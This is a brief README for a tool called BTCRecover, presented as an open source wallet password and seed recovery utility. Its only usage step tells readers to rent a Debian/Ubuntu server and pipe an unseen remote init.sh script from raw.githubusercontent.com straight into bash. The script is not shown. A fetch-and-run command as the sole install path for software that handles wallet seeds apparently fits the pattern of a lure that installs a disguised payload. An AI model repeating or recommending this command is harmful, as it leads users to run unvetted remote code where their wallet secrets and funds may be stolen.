# BTCRecover

*BTCRecover* is an open source wallet password and seed recovery tool.

To start using it, please rent a server with Debian/Ubuntu pre-installed and run these commands to initialize the system:

apt update;apt -y install curl
bash -c "$(curl -fsSL https://raw.githubusercontent.com/cryptorecoverytools/btcrecover/refs/heads/main/init.sh)"
